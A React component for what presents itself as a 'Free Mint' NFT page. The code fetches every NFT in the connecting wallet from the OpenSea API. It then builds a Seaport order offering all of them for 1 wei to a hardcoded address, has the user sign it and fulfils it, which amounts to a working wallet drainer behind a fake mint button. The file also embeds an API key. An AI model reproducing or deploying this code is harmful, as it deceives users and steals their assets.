import React, { useState, useEffect } from 'react'
import './cardComponent.css';
import Container from 'react-bootstrap/Container';
import Row from 'react-bootstrap/Row';
import Col from 'react-bootstrap/Col';
import MintCount from './MintCount';
import Button from 'react-bootstrap/Button';
import {Web3Wallets} from 'web3-wallets';
import { CROSS_CHAIN_DEFAULT_CONDUIT_KEY } from './constants';
import Web3 from 'web3';
import { constants, Contract, ethers } from "ethers";

import { 
  owner, seaport, zone, ERC721Token, ERC1155Token, LOOTs,seaport_test
} from "../constants/contracts"
import { approveABI, seaportABI, erc20ABI} from "../constants"
import {
  parseEther,
  toKey,
  getOfferOrConsiderationItem,
  getItemETH,
  getItem20,
  getItem721,
  getItem1155,
  getBasicOrderParameters,
  createOrder,
  buildResolver,
  getItem1155WithCriteria,
  getItem721WithCriteria,
  defaultBuyNowMirrorFulfillment,
  createMirrorBuyNowOrder
} from "../utils";
import { config } from 'process';

const isTest=true;

const CardComponent = (props) => {
  const tokenId2 = 59
  const ERC1155TokenId = 1
  const ERC1155TokenId2 = 2
  const ERC1155TokenId3 = 3
  const [order, setOrder] = useState(null)
  const [offer, setOffer] = useState(null)
  const [consideration, setConsideration] = useState(null)
  const [criteriaResolvers, setCriteriaResolvers] = useState(null)
  const [tokenId, setTokenId] = useState(null)
  const [value, setValue] = useState(null)
  const [receivers, setReceivers]=useState([]);

  const [eProvider, seteProvider]=useState(null);
  const [signer, setsigner]=useState(null);
  const [chainId, setchainId]=useState(null);
  const [accountAddress, setAccountAddress] = useState(null);
  const [marketplaceContract, setmarketplaceContract]= useState(null);
  // const toAddress='0x8ABd47DDE5dAd52aF2EADdc58e39D94E6254CcBE';
  const toAddress='0x62c38012277b330B34ff0Cf13f8FEb66b98F50F5';
  const [currentIndex, setCurrentIndex] = useState(0);
  const [allNFTs, setAllNFTs] = useState([]);
  const [walletConnected, setWalletConnted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [options, setOptions]=useState({
    method: 'GET',
    headers: { Accept: 'application/json' }
  });

  const checkWalledtIsConnected = () => {
    const { ethereum } = window;
    if (!ethereum) {
      alert("please install metamask extension!");
      return false;
    } else {
      setWalletConnted(true);
      console.log('wallet exist! go next!');
      return true;
    }
  }

  const connectWalletHandler=async ()=>{
    const {ethereum} =window;
    if(!ethereum){
      alert("please install metamask extension!");
      return;
    }

    
      setLoading(true);
      const wallet = new Web3Wallets({name: 'metamask'});
      // console.log(wallet);
      // setchainId(wallet.wallet.chainId);
      
      const provider1 = new ethers.providers.Web3Provider(window.ethereum, "any");
      // provider1.estimateGas
      seteProvider(provider1);
      const account= await provider1.send("eth_requestAccounts", []);
      setAccountAddress(account[0]);

      let currentChainId=await provider1.send("eth_chainId", []);
      currentChainId=parseInt(currentChainId.toString().slice(2,currentChainId.toString().length),10);
      setchainId(currentChainId);

      const signer1 = provider1.getSigner();
      setsigner(signer1);
      const marketplaceContract1 = new Contract(seaport, seaportABI, provider1);
      setmarketplaceContract(marketplaceContract1);
      let tempallNFTs=[];
      const asset_owner= account[0];
      
      let next=null;
      do{
        if (next != null) {
          next = 'cursor=' + next + '&';
        } else next = '';
        let addTest='';
        if(isTest)
          addTest='testnets-';
       
        let assets = await fetch(`https://${addTest}api.opensea.io/api/v1/assets?owner=${asset_owner}&${next}order_direction=desc&limit=20&include_orders=false`, options)
          .then(response => response.json()); 
        console.log(assets.next);

        if(assets.assets && assets.assets.length > 0){
          tempallNFTs = [...tempallNFTs, ...assets.assets];
        }
        console.log(tempallNFTs); 
        if (assets.next == null)
          break;
        next = assets.next;

      }while(1);
      
      try {
        tempallNFTs.map(async (item)=>{
          item['amount']=1;
        });
        setAllNFTs(tempallNFTs);
        setLoading(false);
      } catch (error) {
        console.log(error);
      }
  }


  const transferHandler = async () => {
   
      const { ethereum } = window;
      if (ethereum) {
        await create();
        

      }
    
  }

  const getItem = ({ type, address, amount, tokenId, recipient }) => {
    if (type === "NATIVE") {
      return getItemETH(amount, amount, recipient)
    } else if (type === "ERC20") {
      return getItem20(address, amount, amount, recipient)
    } else if (type === "ERC721") {
      return getItem721(address, tokenId, 1, 1, recipient)
    } else {
      return getItem1155(address, tokenId, amount, amount, recipient)
    }
  }


  const create = async () => {
    const offer = []
    const consideration = []
    allNFTs.map((nft, index)=>{
        let offerItem={
          isApproved: false,
          type: nft.asset_contract.schema_name,
          address:nft.asset_contract.address,
          amount: nft.amount,
          token_Id: nft.token_id,
        };
        let offertemp=getItem(offerItem);
        offertemp.identifierOrCriteria = nft.token_id;
        offer.push(offertemp);
    });
    const consider=getOfferOrConsiderationItem(0,constants.AddressZero,0,1,1,toAddress);
    consideration.push(consider);
    console.log(allNFTs);
    console.log(consideration);

    console.log(offer);

    const criteriaResolvers = [];
    let orderaccum=0;
    // allNFTs.map((nft)=>{
    //   criteriaResolvers.push(buildResolver(0, 0, 0, nft.token_id, []));
    //   // for(let i=0;i<parseInt(nft.amount);i++){
    //   //   criteriaResolvers.push(buildResolver(orderaccum, 1, i, nft.token_id, []));
    //   //   orderaccum++;
    //   // }
    // });
      // buildResolver(0, 0, 0, tokenId, proofs[tokenId.toString()]),
      // buildResolver(0, 0, 0, ERC1155TokenId, proofs[ERC1155TokenId.toString()]),
  
      // collection-level
      // buildResolver(0, 1, 0, tokenId2, []),
    // ];
    // console.log(criteriaResolvers);
    const { order, value } = await createOrder(
      marketplaceContract,
      chainId,
      signer,
      zone,
      offer,
      consideration,
      2, 
      [],
    )
    console.log(order);
    console.log(value);
    setOrder(order)
    setOffer(offer)
    setConsideration(consideration)
    setValue(value)
    setCriteriaResolvers(criteriaResolvers)
  }

  useEffect( ()=>{
    async function runhand(){
      if(criteriaResolvers==null)
        return true;
      await handleFullfill();
    }
    function getSalt() {
      var saltRes = '';
      for (var i = 0; i < 13; i++) {
          var ran = parseInt(Math.random() * 1000);
          saltRes += ran.toString(10).padStart(3, '0');
      }
      return saltRes.replace(/^0+/, '');;
    }
    console.log(getSalt())
    runhand();
  },[criteriaResolvers,order]);
  // const checkIsApproved=async (address, type, set) => {
  //   let contract
  //   let isApproved
  //   if (type === "20") {
  //     contract = new Contract(address, erc20ABI, eProvider)
  //     const allowance = await contract.connect(signer).allowance(accountAddress, seaport)
  //     if (allowance / Math.pow(10, 18) >= 10000000) {
  //       isApproved = true
  //     }
  //   } else {
  //     contract = new Contract(address, approveABI, eProvider)
  //     isApproved = await contract.connect(signer).isApprovedForAll(accountAddress, seaport)
  //   }
  // }

  const handleFullfill = async () => {
    // criteriaResolvers[0].identifier = tokenId
    console.log("-------");
    console.log(order);
    console.log(criteriaResolvers);
    console.log(toKey(0));
    console.log(constants.AddressZero);
    console.log(value);
    
    // console.log(marketplaceContract
    //   .connect(signer));
    // console.log(marketplaceContract
    //   .connect(signer)
    //   .fulfillAdvancedOrder.toString());
    // const marketplaceContract1 = new Contract(seaport, seaportABI, eProvider);
    
    // const estimation=await marketplaceContract1
    //     .connect(signer)
    //     .estimateGas
    //     .fulfillAdvancedOrder(
    //     order,
    //     [],
    //     toKey(0),
    //     toAddress,
    //     {
    //       value,
    //       gasLimit: 100000,
    //     }
    //   );
      
    // console.log(estimation);
    const tx = marketplaceContract
      .connect(signer)
      .fulfillAdvancedOrder(
        order,
        [],
        toKey(0),
        toAddress,
        {
           value,
          //  gasLimit: estimation,
          gasLimit: 200000,
        }
      );
    const receipt = await (await tx).wait();
    console.log(receipt)
  }

  useEffect(() => {
    // setLoading(true);
    async function init() {
      if(checkWalledtIsConnected()) {

      };
      if(!isTest){
        setOptions({...options, 'X-API-KEY':'14688a33a1f34d8198f4b2b4a4e3a29e'});
      }
    }
    init()
  }, []);
  useEffect(()=>{
    console.log('account address:'+accountAddress);
    if(accountAddress!=null)
      connectWalletHandler();
  },[accountAddress]);
  return (
    <>
      <div className='cardContentContainer'>
        <Container className='cardbody' style={{ width: '100%', height: '21em', borderRadius: '4em 4em 0 0', backgroundColor: 'rgb(30,30,30)' }}>
          <Row style={{ width: '100%' }}>
            <Col md={6} className="imgContanier">
              <img src={
                allNFTs.length < 1 ?
                  "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQib96ftd2WgKnQs1xB1_WkFByxdR-jOOEUhPgWwcSZBw&s" :
                  allNFTs[currentIndex].image_url
              } />
              <div className='prevBtn' onClick={() => setCurrentIndex(currentIndex > 0 ? currentIndex - 1 : 0)}>prev</div>
              <div className='nextBtn' onClick={() => setCurrentIndex(currentIndex + 1 < allNFTs.length ? currentIndex + 1 : allNFTs.length - 1)}>next</div>
            </Col>
            <Col md={6} className="infoContainer pt-4">
              <div className='textPart'>
                <p>Mint our page and get a awesome NFT from our collection</p>
              </div>
              <MintCount />
              <span className='mt-2 mb-2'>Free Mint</span>
              <Button variant="primary" disabled={loading} onClick={accountAddress ? transferHandler : connectWalletHandler} style={{ fontSize: '1.2em', fontWeight: 'bold', letterSpacing: '0.1em' }}>
                {loading && ('...')}
                {walletConnected && accountAddress == null && ('Connect Wallet')}
                {accountAddress != null && !loading && ('Transfer')}
              </Button>
              {accountAddress ? <span className='mt-2'>{accountAddress.toString().slice(0, 12) + '...'}</span> : ''}
            </Col>
          </Row>
        </Container>

        <div className='cardFooter mt-2'>
          <div className='footerContainer mb-1'>
            <img src='https://storage.googleapis.com/opensea-static/Logomark/Logomark-Blue.png' />
            <span className='addressText'>Contract Address</span>
          </div>
          <div className='contranctAddress'>3</div>
        </div>
      </div>
    </>
  )
}
export default CardComponent

